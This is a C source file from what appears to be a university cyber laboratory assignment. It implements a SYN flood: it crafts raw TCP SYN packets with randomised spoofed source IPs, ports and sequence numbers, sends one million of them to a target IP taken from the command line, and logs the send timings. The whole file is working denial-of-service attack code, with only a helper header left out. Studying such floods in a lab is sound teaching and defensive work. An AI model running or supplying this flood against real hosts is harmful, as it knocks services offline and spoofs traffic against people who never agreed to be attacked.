/*
 *  Cyber Laboratory Course Assignment 3
 *  Attacker DDoS program
 *  Copyright (C) 2023  Roy Simanovich and Lidor Keren Yehushua
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>
#include <unistd.h>
#include "attck_header.h"

FILE *fp = NULL;
double attack_time = 0.0;
uint32_t attack_count = 0;

// Attacked host = 10.9.0.5

void sigint_handler() {
	fprintf(stdout, "Exiting...\n");

	if (fp != NULL)
	{
		fprintf(fp, "the average time for each packet is: %0.3lf\n", attack_time / attack_count);
		fprintf(fp, "the time for the whole attack is: %0.3lf\n", attack_time);
		fclose(fp);
	}

	exit(EXIT_SUCCESS);
}

int main(int argc, char **argv) {
	// Varibles setup and preparation for the attack
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	struct timeval start, end;

	char buffer[1500] = {0};
	char src_ip[INET_ADDRSTRLEN] = {0};

	size_t count = 0;

	signal(SIGINT, sigint_handler);

	if (argc < 2)
	{
		fprintf(stderr, "Usage: %s <target IP>\n", *argv);
		return EXIT_FAILURE;
	}

	fp = fopen(ATTK_LOG_FILE, "w");

	if (fp == NULL)
	{
		perror("fopen");
		return EXIT_FAILURE;
	}

	iph = (struct iphdr *)buffer;

	iph->version = P_IP_VERSION;
	iph->ihl = P_IP_HL;
	iph->ttl = P_IP_TTL;
	iph->protocol = IPPROTO_TCP;

	if (inet_pton(AF_INET, *(argv + 1), &iph->daddr) != 1)
	{
		perror("inet_pton");
		return EXIT_FAILURE;
	}

	iph->tot_len = htons((iph->ihl * 4) + (P_TCP_HL * 4));

	tcph = (struct tcphdr *)(buffer + (iph->ihl * 4));

	tcph->dest = htons(P_TCP_DPORT);
	tcph->doff = P_TCP_HL;
	tcph->syn = 1;

	for (size_t i = 1; i <= 100; ++i)
	{
		for (size_t j = 1; j <= 10000; ++j)
		{
			// Source IP address randomization
			bzero(src_ip, INET_ADDRSTRLEN);
			sprintf(src_ip, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);

			if (inet_pton(AF_INET, src_ip, &iph->saddr) != 1)
			{
				perror("inet_pton");
				return EXIT_FAILURE;
			}

			// Count the number of packets sent
			++count;

			// Setup random values for the TCP header
			tcph->source = (P_TCP_SPORT != -1 ? htons(P_TCP_SPORT):htons(1024 + (rand() % 64511)));
			tcph->seq = (P_TCP_SEQ != -1 ? htonl(P_TCP_SEQ):htonl(rand() % 4294967295));
			tcph->ack_seq = (P_TCP_ACKSEQ != -1 ? htonl(P_TCP_ACKSEQ):htonl(rand() % 4294967295));
			tcph->window = (P_TCP_WIN != -1 ? htons(P_TCP_WIN):htons(rand() % 65535));
			tcph->check = 0;
			tcph->check = calculate_tcp_checksum(iph);

			gettimeofday(&start, NULL);
			send_raw_ip_packet(iph);
			gettimeofday(&end, NULL);

			double time_taken = ((end.tv_sec - start.tv_sec) * 1000.0) + ((end.tv_usec - start.tv_usec) / 1000.0);
			attack_time += time_taken;
			++attack_count;

			fprintf(fp, "%lu %lf\n", count, time_taken);
		}

		fprintf(stdout, "Completed %lu%% (%lu out of 1,000,000 packets sent).\n", (long unsigned int)(((double)count / 1000000) * 100), count);
	}

	fprintf(stdout, "Successfully sent %lu packets.\n", count);

	fprintf(fp, "the average time for each packet is: %0.3lf\n", attack_time / 1000000);
	fprintf(fp, "the time for the whole attack is: %0.3lf\n", attack_time);

	fclose(fp);

	return EXIT_SUCCESS;
}
